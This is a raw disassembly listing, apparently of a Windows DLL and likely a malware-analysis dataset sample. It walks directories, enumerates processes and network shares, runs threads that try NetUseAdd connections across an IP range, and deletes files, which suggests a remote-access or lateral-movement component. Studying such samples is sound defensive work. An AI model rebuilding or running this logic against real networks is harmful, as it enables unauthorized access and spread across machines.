xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ebp [ esp + 0x10 ]
sub_10005b00
mov edx [ esp + 0x8 ]
sub esp 0x148
mov al [ edx ]
push ebp
test al al
push edi
je r-xdata
pop edi
pop ebp
add esp 0x148
retn
mov ebp [ esp + 0x15c ]
cmp [ ebp ] 0x0
je r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x104
mov [ esp + 0x8 ] ecx
jge r-xdata
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx 0x104
jae r-xdata
push ebx
push esi
push 0x400
call ??2@YAPAXI@Z
mov ebx eax
mov edi ebp
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
cmp [ ebx + ecx - 0x1 ] 0x5c
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x164 ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
mov esi [ esp + 0x164 ]
push esi
call sub_100057e0
add esp 0xc
lea ecx [ esp + 0x18 ]
push ecx
push ebx
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
mov [ esp + 0x14 ] edi
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
push ebx
call ??3@YAXPAX@Z
add esp 0x4
pop esi
pop ebx
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
push edi
call [ FindClose@IAT ]
mov ecx esi
call sub_10001990
test eax eax
jne r-xdata
mov eax [ esi + 0x18 ]
test eax eax
jne r-xdata
lea edx [ esp + 0x44 ]
push edx
call sub_10005730
add esp 0x4
test eax eax
jne r-xdata
lea edx [ esp + 0x18 ]
push edx
push edi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
test [ esp + 0x18 ] 0x10
je r-xdata
push 0x400
call ??2@YAPAXI@Z
mov edi [ esp + 0x168 ]
mov ebp eax
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
cmp [ ecx + ebp - 0x1 ] 0x5c
je r-xdata
lea edi [ esp + 0x44 ]
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x164 ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ esp + 0x164 ]
push ecx
call sub_10005b00
push ebp
call ??3@YAXPAX@Z
mov esi [ esp + 0x16c ]
mov edi [ esp + 0x24 ]
add esp 0x10
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_10005d50
sub esp 0x108
push ebx
push ebp
push esi
push edi
call sub_100041e0
mov eax [ esp + 0x11c ]
push eax
mov ebp [ eax + 0x4 ]
mov ebx [ eax ]
mov [ esp + 0x14 ] ebp
call ??3@YAXPAX@Z
mov edi ebp
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
mov al [ ebp ]
not ecx
dec ecx
test al al
lea esi [ ecx + ebp + 0x1 ]
je r-xdata
push ebp
call ??3@YAXPAX@Z
add esp 0x4
xor esi esi
mov ecx ebx
push esi
push esi
push esi
push 0xffffffff
push 0xa021
call sub_10001f60
mov [ ebx + 0x38 ] esi
mov [ ebx + 0x2c ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x108
retn
test esi esi
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push ebp
call ??3@YAXPAX@Z
add esp 0x4
mov ecx ebx
call sub_10001990
test eax eax
jne r-xdata
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
xor eax eax
pop edi
pop esi
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x2c ] eax
pop ebp
pop ebx
add esp 0x108
retn
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
push 0x3b
push esi
call [ strchr@IAT ]
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
push 0x0
push 0x0
push 0x0
push 0xffffffff
push 0xa021
mov ecx ebx
call sub_10001f60
mov ecx [ esp + 0x10 ]
push esi
push ecx
push ebx
call sub_10005b00
mov ebp [ esp + 0x1c ]
add esp 0xc
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x14 ]
[ edi ]
mov eax ebp
lea ecx [ esp + 0x14 ]
sub eax esi
push eax
push esi
push ecx
call [ strncpy@IAT ]
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x20 ]
push edx
push eax
push ebx
call sub_10005b00
mov al [ ebp + 0x1 ]
lea esi [ ebp + 0x1 ]
mov ebp [ esp + 0x28 ]
add esp 0x18
test al al
jne r-xdata
jmp r-xdata
sub_10005e80
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
lea edi [ ebx + 0x1 ]
push edi
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edi
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
push ebx
and ecx 0x3
push esi
[ edi ]
mov edi [ esp + 0x18 ]
mov ecx edi
call sub_10001870
cmp eax ebx
je r-xdata
push 0x210
call ??2@YAPAXI@Z
push eax
push 0x0
mov [ eax ] edi
mov [ eax + 0x4 ] esi
push sub_10005d50
mov [ edi + 0x38 ] 0x1
call [ _beginthread@IAT ]
add esp 0x10
mov [ edi + 0x2c ] eax
push esi
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebx
retn
sub_10005f00
sub esp 0x128
push esi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push ebx
push edi
mov ecx 0x49
xor eax eax
lea edi [ esp + 0x10 ]
xor ebx ebx
[ edi ]
lea eax [ esp + 0xc ]
mov [ esp + 0xc ] 0x128
push eax
push esi
call Process32First
test eax eax
je r-xdata
or eax eax
pop esi
add esp 0x128
retn
push esi
call [ CloseHandle@IAT ]
mov eax ebx
pop edi
pop ebx
pop esi
add esp 0x128
retn
lea ecx [ esp + 0xc ]
inc ebx
push ecx
push esi
call Process32Next
test eax eax
jne r-xdata
sub_10005f70
sub esp 0x25c
mov ecx 0x43
xor eax eax
push ebx
mov ebx [ esp + 0x264 ]
push ebp
push esi
mov esi [ esp + 0x270 ]
push edi
lea edi [ esp + 0x160 ]
push esi
[ edi ]
lea eax [ esp + 0x164 ]
mov ecx ebx
push eax
call sub_10001870
cmp eax esi
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x160 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
call sub_100041e0
mov edi eax
lea eax [ esp + 0x160 ]
push eax
mov [ esp + 0x14 ] edi
call sub_10005760
mov ebp eax
add esp 0x4
test ebp ebp
jle r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x25c
retn
call [ GetLastError@IAT ]
cmp eax 0x52e
je r-xdata
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x160 ]
push ecx
push edx
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
mov [ esp + 0x18 ] esi
je r-xdata
push 0x0
lea edx [ esp + 0x14 ]
push 0x8
mov [ esp + 0x18 ] 0xfffffffe
mov [ esp + 0x1c ] eax
push edx
cmp eax 0x5
je r-xdata
lea ebp [ ebp + ebp * 4 ]
shl ebp 0x6
push ebp
call ??2@YAPAXI@Z
mov ecx ebp
mov ebx eax
mov edx ecx
xor eax eax
mov edi ebx
add esp 0x4
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edi ebx
mov [ esp + 0x1c ] edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x25c
retn
call [ RevertToSelf@IAT ]
cmp eax 0x3ed
je r-xdata
mov ecx [ esp + 0x20 ]
lea edi [ esp + 0x4c ]
mov [ ebx ] ecx
mov edx [ esp + 0x3c ]
add ebx 0x4
or ecx 0xffffffff
mov [ ebx ] edx
mov eax [ esp + 0x40 ]
add ebx 0x4
mov [ ebx ] eax
xor eax eax
add ebx 0x4
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x4c ]
or ecx 0xffffffff
[ edi ]
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x1c ]
not ecx
dec ecx
lea ebx [ ebx + ecx + 0x1 ]
lea eax [ esp + 0x4c ]
push eax
call sub_10005730
add esp 0x4
test eax eax
jne r-xdata
cmp eax 0x15
je r-xdata
test [ esp + 0x20 ] 0x10
je r-xdata
push esi
mov [ ebx ] 0xffffffff
call [ FindClose@IAT ]
mov ecx [ esp + 0x270 ]
sub ebx edi
add ebx 0x4
push 0x0
push ebx
push edi
push ebp
push 0xa000
call sub_10001f60
push edi
call ??3@YAXPAX@Z
mov eax [ esp + 0x14 ]
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
cmp eax 0x3
je r-xdata
jmp r-xdata
cmp eax 0x7b
je r-xdata
push 0x0
lea ecx [ esp + 0x14 ]
push 0x4
mov [ esp + 0x18 ] 0xffffffff
push ecx
jmp r-xdata
push 0xffffffff
push 0xa000
mov ecx ebx
call sub_10001f60
test edi edi
je r-xdata
sub_10006190
sub esp 0xac
push ebx
push ebp
push esi
push edi
call sub_100041e0
mov esi [ esp + 0xc0 ]
mov ebx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
cmp ebx eax
ja r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0xac
retn
test bl bl
je r-xdata
mov ecx [ esi ]
call sub_10001990
test eax eax
jne r-xdata
push ebx
call [ htonl@IAT ]
push eax
mov [ esp + 0x14 ] eax
call [ inet_ntoa@IAT ]
mov ebp eax
mov ecx 0x20
xor eax eax
lea edi [ esp + 0x3c ]
[ edi ]
lea eax [ esp + 0x3c ]
push rw-data
push eax
call [ wcscpy@IAT ]
add esp 0x8
lea ecx [ esp + 0x40 ]
push 0x3e
push ecx
push 0xffffffff
push ebp
xor ebp ebp
push ebp
push ebp
call [ MultiByteToWideChar@IAT ]
lea edx [ esp + 0x3c ]
push rw-data
push edx
call [ wcscat@IAT ]
mov ecx 0x9
xor eax eax
lea edi [ esp + 0x20 ]
add esp 0x8
[ edi ]
lea eax [ esp + 0x3c ]
lea ecx [ esi + 0xc ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x34 ] ecx
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
lea edx [ esi + 0x10c ]
push 0x2
push ebp
mov [ esp + 0x24 ] ebp
mov [ esp + 0x38 ] 0x3
mov [ esp + 0x30 ] edx
mov [ esp + 0x48 ] ebp
call NetUseAdd
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
mov ecx [ esi ]
push ebp
lea edx [ esp + 0x14 ]
push 0x4
push edx
push 0xffffffff
push 0x9fee
call sub_10001f60
mov ecx [ eax + 0x34 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
cmp ecx eax
je r-xdata
inc ebx
cmp ebx eax
jbe r-xdata
sub_100062c0
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov esi [ eax ]
mov edi [ eax + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
xor ebx ebx
xor eax eax
mov ecx edi
push 0xffffffff
push 0x1
push edi
push eax
call [ WaitForMultipleObjects@IAT ]
push edi
call ??3@YAXPAX@Z
add esp 0x4
mov ecx esi
call sub_10001990
test eax eax
jne r-xdata
inc eax
add ecx 0x4
cmp eax 0xa
jle r-xdata
mov [ esi + 0x28 ] ebx
mov [ esi + 0x34 ] ebx
pop edi
pop esi
pop ebx
retn
push ebx
push ebx
push rw-data
push 0xffffffff
push 0x9fef
mov ecx esi
call sub_10001f60
cmp [ ecx ] ebx
je r-xdata
sub_10006330
sub esp 0x20
push ebx
mov ebx [ esp + 0x2c ]
push ebp
push esi
test ebx ebx
push edi
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push ebx
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0x10 ] esi
je r-xdata
mov ecx ebx
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
push ebx
and ecx 0x3
push esi
[ edi ]
mov ecx [ esp + 0x3c ]
call sub_10001870
cmp eax ebx
je r-xdata
mov ebx [ esi ]
add esi 0x4
or ecx 0xffffffff
xor eax eax
lea edx [ esi + 0x4 ]
mov ebp [ esi ]
mov edi edx
mov [ esp + 0x20 ] ebx
[ edi ]
not ecx
dec ecx
mov [ esp + 0x24 ] ebp
mov [ esp + 0x14 ] edx
lea esi [ ecx + edx + 0x1 ]
or ecx 0xffffffff
mov edi esi
mov [ esp + 0x18 ] esi
[ edi ]
not ecx
dec ecx
cmp ebx ebp
lea eax [ ecx + esi + 0x1 ]
mov [ esp + 0x1c ] eax
ja r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x10 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov ecx ebp
xor ecx ebx
test ecx 0xffff0000
jne r-xdata
cmp [ edx ] 0x0
je r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ eax ] 0x0
je r-xdata
mov ecx ebp
mov eax 0x66666667
sub ecx ebx
inc ecx
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
mov eax ecx
mov [ esp + 0x38 ] edx
mov ecx 0xa
cdq
idiv ecx
test edx edx
je r-xdata
push 0x2c
call ??2@YAPAXI@Z
mov esi eax
mov ecx 0xb
xor eax eax
mov edi esi
[ edi ]
push 0x210
mov [ esp + 0x30 ] esi
call ??2@YAPAXI@Z
mov ecx [ esp + 0x3c ]
mov ebx [ MultiByteToWideChar@IAT ]
add esp 0x8
mov [ eax ] ecx
mov [ eax + 0x4 ] esi
mov [ esp + 0x2c ] eax
mov [ ecx + 0x34 ] 0x1
xor ebp ebp
inc [ esp + 0x38 ]
push esi
push 0x0
push sub_10006190
call [ _beginthread@IAT ]
mov ecx [ esp + 0x34 ]
add esp 0xc
mov [ ecx + ebp * 4 ] eax
inc ebp
cmp ebp 0xa
jle r-xdata
mov [ esi + 0x8 ] ecx
mov ebp 0x14
push 0x30c
call ??2@YAPAXI@Z
mov esi eax
mov ecx 0xc3
xor eax eax
mov edi esi
mov edx [ esp + 0x38 ]
add esp 0x4
[ edi ]
mov ecx [ esp + 0x14 ]
lea eax [ esi + 0xc ]
push 0x80
push eax
push 0xffffffff
push ecx
push 0x0
push 0x0
mov [ esi ] edx
call ebx
mov eax [ esp + 0x18 ]
lea edx [ esi + 0x10c ]
push 0x80
push edx
push 0xffffffff
push eax
push 0x0
push 0x0
call ebx
mov edx [ esp + 0x1c ]
lea ecx [ esi + 0x20c ]
push 0x80
push ecx
push 0xffffffff
push edx
push 0x0
push 0x0
call ebx
mov ecx [ esp + 0x38 ]
mov eax ebp
imul eax ecx
mov edx [ esp + 0x20 ]
add eax edx
mov [ esi + 0x4 ] eax
lea eax [ eax + ecx - 0x1 ]
mov ecx [ esp + 0x24 ]
cmp eax ecx
mov [ esi + 0x8 ] eax
jb r-xdata
mov edx [ esp + 0x2c ]
push edx
push 0x0
push sub_100062c0
call [ _beginthread@IAT ]
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x1c ]
push edx
mov [ ecx + 0x28 ] eax
call ??3@YAXPAX@Z
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
sub_10006560
sub esp 0x20
push ebx
mov ebx [ esp + 0x2c ]
push ebp
push esi
test ebx ebx
push edi
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push ebx
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov ecx ebx
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
mov ebp [ esp + 0x34 ]
push ebx
[ edi ]
mov ecx edx
push esi
and ecx 0x3
[ edi ]
mov ecx ebp
call sub_10001870
cmp eax ebx
je r-xdata
mov ecx 0x8
xor eax eax
lea edi [ esp + 0x10 ]
[ edi ]
mov edi esi
or ecx 0xffffffff
mov [ esp + 0x24 ] esi
[ edi ]
not ecx
dec ecx
lea ebx [ ecx + esi + 0x1 ]
or ecx 0xffffffff
mov edi ebx
[ edi ]
not ecx
dec ecx
lea edi [ ecx + ebx + 0x1 ]
call sub_100041e0
push 0x4
push ebx
lea eax [ esp + 0x18 ]
push edi
push eax
call WNetAddConnection2A
push esi
mov [ esp + 0x3c ] eax
call ??3@YAXPAX@Z
add esp 0x4
lea ecx [ esp + 0x38 ]
push 0x0
push 0x4
push ecx
push 0xffffffff
push 0xa019
mov ecx ebp
call sub_10001f60
push esi
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
sub_10006630
sub esp 0x84
mov al 0x5c
lea ecx [ esp + 0x6 ]
mov [ esp + 0x5 ] al
mov [ esp + 0x4 ] al
lea eax [ esp ]
mov [ esp ] 0x7c
push eax
push ecx
call [ GetComputerNameA@IAT ]
mov eax [ esp + 0x88 ]
lea edx [ esp + 0x4 ]
push edx
push eax
call [ _strcmpi@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x8c
retn
sub_10006680
sub esp 0x10
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x8 ]
push ebx
push eax
push ecx
push 0x0
push 0x0
push 0x2
mov [ esp + 0x18 ] 0x4000
mov [ esp + 0x1c ] 0xffffffff
call WNetOpenEnumA
test eax eax
jne r-xdata
pop ebx
add esp 0x10
retn
mov edx [ esp + 0x4 ]
push edx
push 0x40
call [ GlobalAlloc@IAT ]
mov ebx eax
test ebx ebx
mov [ esp + 0x10 ] ebx
jne r-xdata
push ebp
mov ebp [ esp + 0x20 ]
push esi
push edi
mov eax 0x8
pop ebx
add esp 0x10
retn
push ebx
call [ GlobalFree@IAT ]
mov ecx [ esp + 0x18 ]
push ecx
call WNetCloseEnum
pop edi
pop esi
pop ebp
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x14 ]
test eax eax
jbe r-xdata
mov ecx [ esp + 0x10 ]
xor eax eax
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edx [ esp + 0x18 ]
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x18 ]
push ebx
push ecx
push edx
call WNetEnumResourceA
test eax eax
jne r-xdata
add ebx 0x14
mov eax [ ebx - 0x8 ]
and eax 0x2
cmp al 0x2
jne r-xdata
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x24 ]
lea edx [ ebx - 0x14 ]
push ecx
push edx
push ebp
push eax
call sub_10006680
add esp 0x10
jmp r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x14 ]
inc eax
add ebx 0x20
cmp eax ecx
mov [ esp + 0x28 ] eax
jb r-xdata
mov eax [ ebx ]
push eax
call sub_10006630
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x5c
jne r-xdata
cmp [ ebx - 0xc ] 0x2
jne r-xdata
mov ebx [ esp + 0x1c ]
jmp r-xdata
mov edx [ ebp ]
mov esi [ esp + 0x24 ]
mov ecx edx
sub ecx esi
cmp ecx 0x80000
jge r-xdata
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
mov edi [ ebx ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebx ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ edx + ecx + 0x1 ]
mov edx [ esp + 0x28 ]
lea ecx [ ebx - 0x14 ]
mov [ eax ] 0x3c
push ecx
inc eax
push ebp
push edx
mov [ ebp ] eax
call sub_10006680
mov eax [ ebp ]
add esp 0x10
mov [ eax ] 0x3e
inc eax
jmp r-xdata
add eax 0x2
push 0x5c
push eax
call [ strchr@IAT ]
mov edx eax
add esp 0x8
test edx edx
je r-xdata
mov [ ebp ] eax
inc edx
test edx edx
je r-xdata
mov eax [ ebp ]
mov esi [ esp + 0x24 ]
mov [ esp + 0x2c ] eax
sub eax esi
cmp eax 0x80000
jge r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x2c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
mov edx [ esp + 0x2c ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
sub_10006890
sub esp 0x24
push ebx
push 0x80000
call ??2@YAPAXI@Z
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop ebx
add esp 0x24
retn
push ebp
mov ebp [ esp + 0x30 ]
push esi
push edi
mov ecx 0x8
xor eax eax
lea edi [ esp + 0x14 ]
lea esi [ ebp + 0x8 ]
[ edi ]
mov eax 0x2
mov [ esp + 0x28 ] esi
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x14 ] eax
call sub_100041e0
mov dl [ esi ]
xor eax eax
test dl dl
sete al
mov esi eax
mov edi [ ebp ]
mov ecx esi
lea edx [ esp + 0x14 ]
neg ecx
sbb ecx ecx
push esi
not ecx
and ecx edx
lea eax [ esp + 0x14 ]
push ecx
push eax
push ebx
mov [ esp + 0x20 ] ebx
call sub_10006680
mov ecx [ esp + 0x20 ]
add esp 0x10
mov [ ecx ] 0xffffffff
mov edx [ esp + 0x10 ]
mov ecx 0x4
add edx ecx
test esi esi
mov [ esp + 0x10 ] edx
jne r-xdata
mov ecx edi
call sub_10001990
test eax eax
jne r-xdata
test eax eax
je r-xdata
push ebx
call ??3@YAXPAX@Z
push ebp
call ??3@YAXPAX@Z
add esp 0x8
mov [ edi + 0x30 ] 0x0
pop edi
pop esi
pop ebp
mov eax [ edi + 0x18 ]
test eax eax
jne r-xdata
mov [ edx ] eax
mov eax [ esp + 0x10 ]
add eax ecx
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x10 ]
push 0x0
sub eax ebx
mov ecx edi
neg esi
sbb esi esi
push eax
push ebx
add esi 0x9fed
push 0x80000
push esi
call sub_10001f60
sub_10006990
push ebx
push esi
push edi
push 0x210
call ??2@YAPAXI@Z
mov ebx [ esp + 0x18 ]
mov esi eax
mov ecx 0x84
xor eax eax
mov edi esi
add esp 0x4
[ edi ]
mov edi [ esp + 0x10 ]
lea eax [ esi + 0x8 ]
test ebx ebx
mov [ esi ] edi
mov [ eax ] 0x0
je r-xdata
push esi
push 0x0
push sub_10006890
call [ _beginthread@IAT ]
add esp 0xc
mov [ edi + 0x30 ] eax
push ebx
push eax
mov ecx edi
call sub_10001870
cmp eax ebx
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_100069f0
sub esp 0x104
mov ecx 0x41
xor eax eax
push esi
mov esi [ esp + 0x110 ]
push edi
lea edi [ esp + 0x8 ]
[ edi ]
mov ecx [ esp + 0x110 ]
lea eax [ esp + 0x8 ]
push esi
push eax
call sub_10001870
pop edi
cmp eax esi
pop esi
je r-xdata
lea ecx [ esp ]
push 0x0
push ecx
call [ CreateDirectoryA@IAT ]
xor eax eax
add esp 0x104
retn
or eax 0xffffffff
add esp 0x104
retn
sub_10006a50
sub esp 0x124
mov ecx 0x41
xor eax eax
push esi
mov esi [ esp + 0x130 ]
push edi
lea edi [ esp + 0x28 ]
[ edi ]
mov ecx [ esp + 0x130 ]
lea eax [ esp + 0x28 ]
push esi
push eax
call sub_10001870
cmp eax esi
je r-xdata
mov eax [ esp + 0x138 ]
test eax eax
je r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0x124
retn
lea eax [ esp + 0x28 ]
push eax
call [ DeleteFileA@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x124
retn
mov ecx 0x7
xor eax eax
lea edi [ esp + 0x8 ]
lea edx [ esp + 0x8 ]
[ edi ]
lea ecx [ esp + 0x28 ]
push edx
stosw [ edi ]
mov [ esp + 0x10 ] 0x3
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] 0x614
call [ SHFileOperationA@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x124
retn
sub_10006b00
sub esp 0x340
mov ecx 0x86
xor eax eax
push esi
mov esi [ esp + 0x34c ]
push edi
lea edi [ esp + 0x28 ]
cmp esi 0x218
[ edi ]
jb r-xdata
mov ecx [ esp + 0x34c ]
lea eax [ esp + 0x28 ]
push esi
push eax
call sub_10001870
cmp eax esi
je r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0x340
retn
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
mov al [ esp + 0x2c ]
not ecx
dec ecx
test al al
lea ebp [ esp + ecx + 0x2d ]
je r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0x340
retn
pop ebp
pop edi
mov eax 0x1
pop esi
add esp 0x340
retn
cmp [ ebp ] 0x0
je r-xdata
lea edi [ esp + 0x2c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x104
jae r-xdata
mov esi [ strchr@IAT ]
push 0x5c
push ebp
call esi
add esp 0x8
test eax eax
jne r-xdata
push 0x3f
push ebp
call esi
add esp 0x8
test eax eax
jne r-xdata
push 0x2a
push ebp
call esi
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x41
lea edi [ esp + 0x244 ]
[ edi ]
stosb [ edi ]
lea edi [ esp + 0x2c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x244 ]
[ edi ]
not ecx
sub edi ecx
push ebx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x30 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ edx + ecx + 0x10 ]
push eax
call ??2@YAPAXI@Z
mov ebx eax
lea edi [ esp + 0x34 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov edx ecx
mov esi edi
mov edi ebx
push ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ strrchr@IAT ]
add esp 0xc
test eax eax
je r-xdata
push ebx
call ??3@YAXPAX@Z
add esp 0x4
pop ebx
lea edx [ eax + 0x1 ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push edx
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x14 ]
mov [ ecx + ebx + 0x1 ] al
mov [ ecx + ebx ] al
mov ecx 0x7
[ edi ]
lea ecx [ esp + 0x24c ]
stosw [ edi ]
mov [ esp + 0x18 ] 0x4
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] ebx
